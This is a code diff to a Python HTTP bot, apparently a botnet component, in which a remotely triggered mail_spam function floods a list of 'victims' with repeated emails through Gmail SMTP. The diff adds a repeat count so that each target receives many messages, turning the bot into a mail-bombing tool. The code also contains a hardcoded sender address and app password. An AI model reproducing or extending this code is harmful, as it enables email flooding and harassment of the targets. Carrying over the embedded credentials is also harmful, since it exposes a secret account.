@@ -55,7 +55,7 @@ class Bot(BaseHTTPRequestHandler):
             body = json.loads(self.rfile.read(content_length).decode('utf-8'))
 
             t = threading.Thread(target=mail_spam,
-                                 args=(body['emails'], body['message'], body["mail_object"], self.event))
+                                 args=(body['emails'], body['message'], body["mail_object"], body["number_of_emails"]))
             self.start_thread(t)
 
 
@@ -65,19 +65,20 @@ def run():
     server.serve_forever()
 
 
-def mail_spam(victims, message, obj, _):
+def mail_spam(victims, message, obj, number_of_emails):
     try:
         sender = "botnetsicurezza@gmail.com"
         password = "cebqshlncuewhjso"
-        for victim in victims:
-            msg = MIMEText(message)
-            msg['Subject'] = obj
-            msg['From'] = sender
-            msg['To'] = victim
-            smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-            smtp_server.login(sender, password)
-            smtp_server.sendmail(sender, victim, msg.as_string())
-            smtp_server.quit()
+        for _ in range(number_of_emails):
+            for victim in victims:
+                msg = MIMEText(message)
+                msg['Subject'] = obj
+                msg['From'] = sender
+                msg['To'] = victim
+                smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+                smtp_server.login(sender, password)
+                smtp_server.sendmail(sender, victim, msg.as_string())
+                smtp_server.quit()
     except Exception as e:
         print(e)
 
